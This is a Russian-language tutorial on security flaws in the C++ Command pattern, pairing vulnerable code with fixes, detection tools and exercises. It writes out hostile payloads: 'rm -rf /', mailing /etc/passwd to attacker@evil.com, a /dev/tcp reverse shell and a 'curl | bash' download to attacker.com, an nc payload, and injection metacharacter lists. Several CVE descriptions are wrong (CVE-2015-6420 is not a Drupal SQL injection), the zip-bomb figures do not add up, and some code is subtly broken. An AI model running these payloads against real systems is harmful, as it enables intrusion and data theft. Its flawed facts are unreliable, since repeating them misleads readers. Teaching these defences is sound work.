# Анализ безопасности паттерна Command

## Обзор

Паттерн Command инкапсулирует запросы как объекты, но при неправильной реализации становится источником критических уязвимостей. Это один из наиболее опасных паттернов с точки зрения безопасности из-за потенциала для command injection, privilege escalation и remote code execution.

## Критические уязвимости

### 1. Command Injection (CWE-77/78)

**Описание**: Прямое выполнение пользовательского ввода как системной команды без валидации.

**Механизм атаки**:
```cpp
// УЯЗВИМЫЙ КОД
class ShellCommand {
    std::string command_;
public:
    void execute() {
        system(command_.c_str());  // COMMAND INJECTION!
    }
};

// Атака через метасимволы shell
ShellCommand cmd("ls; rm -rf /");  // Выполнит ОБЕ команды!
ShellCommand cmd("cat /etc/passwd | mail attacker@evil.com");
ShellCommand cmd("echo `whoami`");  // Command substitution
```

**Payload примеры**:
```bash
# Разделители команд
input; malicious_command
input && malicious_command
input || malicious_command
input | malicious_command

# Command substitution
$(malicious_command)
`malicious_command`

# Redirect
input > /dev/null; malicious_command
```

**Последствия**:
- **Remote Code Execution** - полный контроль над системой
- **Data Exfiltration** - кража данных
- **Privilege Escalation** - получение root прав
- **Persistence** - установка backdoors

**CVE примеры**:
- CVE-2021-44228 (Log4Shell): RCE через JNDI injection
- CVE-2020-1938 (Ghostcat): Command execution через Tomcat
- CVE-2019-0708 (BlueKeep): RCE через RDP

**Детектирование**:
```bash
# Статический анализ
clang++ --analyze -Xanalyzer -analyzer-checker=alpha.security.taint \
    command_vulnerabilities.cpp

# Runtime детектирование
strace -f ./command_app 2>&1 | grep execve
# Output: execve("/bin/sh", ["sh", "-c", "rm -rf /"], ...)
```

**Решение**:
```cpp
class SafeShellCommand {
    std::string command_;
    std::vector<std::string> args_;
    
    static const std::set<std::string> WHITELIST = {
        "ls", "pwd", "date", "whoami"
    };
    
    bool validate() {
        // 1. Whitelist проверка
        if (WHITELIST.find(command_) == WHITELIST.end()) {
            return false;
        }
        
        // 2. Проверка аргументов на метасимволы
        std::regex dangerous("[;&|`$()<>\\\\]");
        for (const auto& arg : args_) {
            if (std::regex_search(arg, dangerous)) {
                return false;
            }
        }
        return true;
    }
    
    void execute() {
        if (!validate()) throw SecurityException("Blocked");
        
        // Использовать execv вместо system
        // execv не интерпретирует shell метасимволы
    }
};
```

### 2. Privilege Escalation (CWE-269)

**Описание**: Нет атомарной проверки прав перед выполнением привилегированных команд.

**Механизм атаки (TOCTOU)**:
```cpp
// УЯЗВИМЫЙ КОД
class PrivilegedExecutor {
    User* current_user_;
    
    void execute(Command* cmd) {
        // Time of Check
        if (current_user_->hasPermission(cmd->getRequired())) {
            // [GAP] - другой поток может изменить current_user_!
            
            // Time of Use
            cmd->execute();  // Может выполниться с другими правами!
        }
    }
};
```

**Эксплойт**:
```cpp
// Thread 1: Атакующий
executor.execute(admin_command);  // Начинает проверку как USER

// Thread 2: Race condition
std::this_thread::sleep_for(50ms);  // Ждем проверки
executor.setUser(admin);  // Меняем на ADMIN!

// Thread 1 продолжает с ADMIN правами!
```

**Последствия**:
- **Horizontal Privilege Escalation** - доступ к чужим данным
- **Vertical Privilege Escalation** - получение админ прав
- **Account Takeover** - захват аккаунтов

**CVE примеры**:
- CVE-2021-3156 (Sudo Baron Samedit): Heap overflow → root
- CVE-2019-14287 (Sudo): Bypass via UID -1

**Детектирование**:
```bash
# ThreadSanitizer обнаруживает TOCTOU
g++ -fsanitize=thread -g command_vulnerabilities.cpp
./a.out
# Output: WARNING: ThreadSanitizer: data race
#   Write at 0x... by thread T2
#   Previous read at 0x... by thread T1
```

**Решение**:
```cpp
class SecureCommand {
    std::shared_ptr<SecurityContext> context_;  // Неизменяемый контекст
    Permission required_;
    
    void execute() {
        // Проверка ВНУТРИ execute - атомарно!
        if (context_->getPermission() < required_) {
            throw PermissionDenied();
        }
        
        // Выполнение с гарантированными правами
        doExecute();
    }
};
```

### 3. Command History Information Leakage (CWE-532)

**Описание**: История команд содержит конфиденциальные данные в plain text.

**Механизм**:
```cpp
class PasswordCommand {
    std::string username_;
    std::string password_;  // PLAIN TEXT!
    
    std::string getDescription() {
        return "login: " + username_ + " pass: " + password_;
    }
};

// История сохраняется в файл
history.saveToFile("/var/log/commands.log");
// Файл содержит все пароли в открытом виде!
```

**Типы утекающих данных**:
- Пароли и токены
- API keys
- SSH private keys
- Credit card numbers
- Personal Identifiable Information (PII)

**Последствия**:
- **Credential Theft** - кража учетных данных
- **Session Hijacking** - перехват сессий
- **Identity Theft** - кража личности
- **Compliance Violations** - нарушение GDPR, PCI DSS

**Детектирование**:
```bash
# Поиск секретов в логах
grep -rE "(password|api[_-]?key|secret)" /var/log/

# Truffleহог для поиска secrets
trufflehog filesystem /var/log/ --json
```

**Решение**:
```cpp
class SecureCommand {
    std::string sensitive_data_;
    
    std::string getDescription() const {
        return "PasswordChange: [REDACTED]";  // Не включаем данные
    }
    
    std::string getAuditLog() const {
        // Только хеш для аудита
        size_t hash = std::hash<std::string>{}(sensitive_data_);
        return "hash=" + std::to_string(hash);
    }
};

// PII Scrubbing
class LogScrubber {
    static std::string scrub(const std::string& text) {
        std::regex password_pattern("password[=:]\\s*\\S+");
        return std::regex_replace(text, password_pattern, "password=[REDACTED]");
    }
};
```

### 4. Insecure Deserialization (CWE-502)

**Описание**: Небезопасная десериализация команд позволяет выполнить произвольный код.

**Механизм атаки**:
```cpp
// УЯЗВИМЫЙ КОД
class SerializableCommand {
    static Command* deserialize(const std::string& data) {
        std::string type = data.substr(0, data.find('|'));
        std::string payload = data.substr(data.find('|') + 1);
        
        // ОПАСНО: Создание объекта по строке без валидации!
        if (type == "system") {
            return new SystemCommand(payload);  // RCE!
        }
    }
};

// Атака
std::string malicious = "system|rm -rf /";
auto cmd = deserialize(malicious);
cmd->execute();  // RCE!
```

**Payload примеры**:
```
type|payload
system|/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
eval|__import__('os').system('whoami')
exec|curl attacker.com/backdoor.sh | bash
```

**Последствия**:
- **Remote Code Execution**
- **Server-Side Request Forgery (SSRF)**
- **Denial of Service**

**CVE примеры**:
- CVE-2017-5638 (Apache Struts): Deserialization RCE
- CVE-2015-6420 (Drupal): SQL injection via serialized data

**Решение**:
```cpp
class SecureDeserializer {
    // Whitelist типов
    static const std::map<std::string, CommandFactory> ALLOWED_TYPES = {
        {"print", PrintCommandFactory},
        {"log", LogCommandFactory}
    };
    
    static Command* deserialize(const std::string& data) {
        auto [type, payload] = split(data);
        
        // Строгая проверка типа
        if (ALLOWED_TYPES.find(type) == ALLOWED_TYPES.end()) {
            throw DeserializationError("Unknown type: " + type);
        }
        
        // Валидация payload
        if (!validatePayload(payload)) {
            throw DeserializationError("Invalid payload");
        }
        
        return ALLOWED_TYPES.at(type).create(payload);
    }
};
```

### 5. Replay Attack (CWE-294)

**Описание**: Критические команды могут быть перехвачены и воспроизведены повторно.

**Механизм атаки**:
```cpp
// УЯЗВИМЫЙ КОД
class TransferCommand {
    double amount_;
    std::string from_, to_;
    
    void execute() {
        bankAPI.transfer(from_, to_, amount_);
    }
};

// Атака: Man-in-the-Middle перехватывает команду
TransferCommand cmd("Alice", "Bob", 1000);
cmd.execute();  // Легитимный перевод

// Атакующий повторяет команду 10 раз
for (int i = 0; i < 10; ++i) {
    cmd.execute();  // REPLAY!
}
// Alice потеряла $10,000 вместо $1,000
```

**Последствия**:
- **Financial Fraud** - финансовое мошенничество
- **Unauthorized Actions** - несанкционированные действия
- **Data Duplication** - дублирование данных

**Детектирование**:
```bash
# Анализ сетевого трафика
tcpdump -i any -A | grep -E "transfer|payment"
# Поиск дубликатов команд

# Wireshark фильтры
tcp.stream eq 1 and frame contains "TransferCommand"
```

**Решение**:
```cpp
class ReplayProtectedCommand {
    std::string nonce_;  // Уникальный ID
    std::chrono::time_point<std::chrono::system_clock> timestamp_;
    std::string signature_;  // HMAC подпись
    
    static std::set<std::string> used_nonces_;
    
    bool validate() {
        // 1. Проверка nonce
        if (used_nonces_.find(nonce_) != used_nonces_.end()) {
            return false;  // Уже использован!
        }
        
        // 2. Проверка timestamp (не старше 5 минут)
        auto age = std::chrono::system_clock::now() - timestamp_;
        if (age > std::chrono::minutes(5)) {
            return false;
        }
        
        // 3. Проверка HMAC подписи
        std::string expected = computeHMAC(nonce_ + timestamp_);
        if (signature_ != expected) {
            return false;
        }
        
        return true;
    }
    
    void execute() {
        if (!validate()) throw ReplayDetected();
        
        used_nonces_.insert(nonce_);  // Отмечаем как использованный
        doExecute();
    }
};
```

### 6. Command Amplification DoS (CWE-400)

**Описание**: Вложенные макро-команды вызывают экспоненциальный рост и DoS.

**Механизм атаки**:
```cpp
// УЯЗВИМЫЙ КОД
class MacroCommand {
    std::vector<Command*> commands_;
    
    void execute() {
        for (auto* cmd : commands_) {
            cmd->execute();  // Рекурсивно!
        }
    }
};

// Атака: Command bomb
auto level1 = new MacroCommand();  // 10 команд
auto level2 = new MacroCommand();  // 10 * level1 = 100
auto level3 = new MacroCommand();  // 10 * level2 = 1,000
auto bomb = new MacroCommand();    // 10 * level3 = 10,000+

bomb->execute();  // CPU spike, memory exhaustion
```

**ZIP Bomb аналогия**:
```
42.zip (42 KB)
  ├─ Level 1 (420 KB × 10)
  ├─ Level 2 (4.2 MB × 100)
  ├─ Level 3 (42 MB × 1,000)
  └─ Bomb (420 MB × 10,000) = 4.2 PB
```

**Последствия**:
- **CPU Exhaustion** - 100% utilization
- **Memory Exhaustion** - OOM
- **Stack Overflow** - crash
- **Denial of Service**

**Решение**:
```cpp
class BoundedMacroCommand {
    static constexpr size_t MAX_COMMANDS = 100;
    static constexpr size_t MAX_DEPTH = 3;
    
    size_t depth_;
    std::vector<Command*> commands_;
    
    bool add(Command* cmd) {
        // Проверка глубины
        auto macro = dynamic_cast<MacroCommand*>(cmd);
        if (macro && macro->depth_ >= MAX_DEPTH) {
            return false;
        }
        
        // Проверка общего количества
        if (countTotal() >= MAX_COMMANDS) {
            return false;
        }
        
        commands_.push_back(cmd);
        return true;
    }
};
```

## Дополнительные уязвимости

### 7. Path Traversal (CWE-22)
```cpp
// FileCommand("../../etc/passwd")  // Directory traversal
```

### 8. XML External Entity (XXE)
```cpp
// CommandFromXML("<cmd><!ENTITY xxe SYSTEM 'file:///etc/passwd'>")
```

### 9. SQL Injection через Command parameters
```cpp
// DatabaseCommand("' OR '1'='1")
```

### 10. Side Channel Attacks
Утечка информации через время выполнения команд.

## Инструменты анализа

### Статический анализ

#### Semgrep (SAST)
```yaml
rules:
  - id: command-injection
    pattern: system($USER_INPUT)
    message: Potential command injection
    severity: ERROR
```

#### CodeQL
```ql
import cpp

from FunctionCall call
where call.getTarget().getName() = "system"
  and call.getArgument(0).mayBeFromUser()
select call, "Command injection risk"
```

#### Clang Taint Analysis
```bash
clang++ --analyze \
  -Xanalyzer -analyzer-checker=alpha.security.taint.TaintPropagation \
  command_vulnerabilities.cpp
```

### Динамический анализ

#### Fuzzing с AFL
```bash
# Компиляция с AFL
afl-g++ command_app.cpp -o command_app_fuzz

# Fuzzing
afl-fuzz -i testcases/ -o findings/ ./command_app_fuzz @@
```

#### Strace для мониторинга system calls
```bash
strace -f -e trace=execve,fork ./command_app
# Обнаруживает вызовы system()
```

#### Динамический Taint Tracking
```bash
# Valgrind + MemorySanitizer
g++ -fsanitize=memory command_vulnerabilities.cpp
./a.out
```

### Penetration Testing

#### Burp Suite Extensions
- Command Injection Scanner
- Deserialization Scanner

#### OWASP ZAP
```
Active Scan → Command Injection
Payloads: '; whoami', '|| id', '`cat /etc/passwd`'
```

## Практические задания

### Задание 1: Найти Command Injection

```bash
# Статический анализ
semgrep --config "p/command-injection" command_vulnerabilities.cpp

# Динамический тест
echo "ls; whoami" | ./command_app
# Должен выполнить обе команды
```

### Задание 2: Эксплуатация TOCTOU

```bash
# Компиляция с TSan
g++ -fsanitize=thread -g command_vulnerabilities.cpp

# Stress test
for i in {1..1000}; do ./a.out & done
# Найти успешную эскалацию
```

### Задание 3: Credentials Extraction

```bash
# Поиск паролей в истории
grep -rE "(password|api_key)" /var/log/command_history.log

# TruffleHog
trufflehog filesystem /var/log/
```

### Задание 4: Deserialization RCE

```bash
# Отправить malicious payload
echo "system|cat /etc/passwd" | nc target.com 8080

# Проверить execution
tcpdump -i any -A port 8080
```

## Защитные меры

### Defense in Depth

1. **Input Validation**
   - Whitelist разрешенных команд
   - Regex для блокировки метасимволов
   - Length limits

2. **Principle of Least Privilege**
   - Минимальные права для команд
   - SELinux/AppArmor policies
   - Контейнеризация (Docker, Kubernetes)

3. **Output Encoding**
   - Sanitize перед логированием
   - Redact sensitive data
   - Structured logging (JSON)

4. **Cryptographic Protection**
   - HMAC подписи команд
   - Nonce для replay protection
   - Timestamp validation

5. **Rate Limiting**
   - Throttling критических команд
   - CAPTCHA для веб-интерфейсов
   - IP-based limiting

6. **Monitoring & Alerting**
   - SIEM интеграция
   - Anomaly detection
   - Real-time alerts

### Безопасная архитектура

```
┌─────────────┐
│   Client    │
└──────┬──────┘
       │ Request
       ▼
┌─────────────────┐
│  Input Validator│ ◄── Whitelist
└──────┬──────────┘
       │ Sanitized
       ▼
┌─────────────────┐
│ Command Factory │
└──────┬──────────┘
       │ Typed Command
       ▼
┌─────────────────┐
│ Permission Check│ ◄── RBAC
└──────┬──────────┘
       │ Authorized
       ▼
┌─────────────────┐
│   Audit Log     │
└──────┬──────────┘
       │
       ▼
┌─────────────────┐
│  Execute (Safe) │ ◄── Sandbox
└─────────────────┘
```

## Связь с другими паттернами

### Chain of Responsibility
Command может передаваться по цепочке обработчиков (риск bypass проверок).

### Memento
Сохранение state команды (риск утечки данных).

### Observer
Commands уведомляют observers (риск information disclosure).

### Strategy
Command как strategy (наследует уязвимости обоих).

## Compliance

### OWASP Top 10
- **A03:2021 Injection** - Command Injection
- **A01:2021 Broken Access Control** - Privilege Escalation
- **A08:2021 Software Integrity Failures** - Deserialization

### CWE Top 25
- CWE-78: OS Command Injection (#12)
- CWE-502: Deserialization (#15)
- CWE-269: Improper Privilege Management (#17)

### Standards
- PCI DSS 6.5.1: Injection flaws
- NIST SP 800-53: CM-7 (Least Functionality)
- ISO 27001: A.14.2 (Security in development)

## Чек-лист безопасности

- [ ] Whitelist разрешенных команд
- [ ] Валидация всех аргументов (regex, length)
- [ ] Нет использования system/exec с user input
- [ ] Проверка прав атомарна (внутри execute)
- [ ] Sensitive data не в истории/логах
- [ ] Nonce/timestamp для replay protection
- [ ] HMAC подпись критических команд
- [ ] Ограничение глубины макро-команд (max 3)
- [ ] Rate limiting на критические операции
- [ ] Валидация при десериализации
- [ ] Аудит логирование всех команд
- [ ] Тестирование с SAST/DAST tools

## Ресурсы

### Книги
- "Web Application Security" - Andrew Hoffman
- "The Tangled Web" - Michal Zalewski

### Стандарты
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)

### Tools
- [Semgrep](https://semgrep.dev)
- [CodeQL](https://codeql.github.com)
- [Commix](https://github.com/commixproject/commix) - Command Injection Exploitation Tool

## Заключение

Command паттерн — один из самых опасных с точки зрения безопасности. Главные риски:

**🔴 Критические**:
- Command Injection → RCE
- Privilege Escalation → Full Compromise
- Deserialization → RCE

**🟡 Важные**:
- Information Leakage → Credentials Theft
- Replay Attacks → Financial Fraud
- DoS → Service Disruption

**Ключевые принципы защиты**:
1. **Never trust user input** - всегда валидировать
2. **Whitelist > Blacklist** - разрешать известное, а не блокировать опасное
3. **Defense in Depth** - многоуровневая защита
4. **Principle of Least Privilege** - минимальные права
5. **Fail Securely** - безопасный отказ

**Золотое правило**: Любой Command с user input — потенциальная уязвимость!
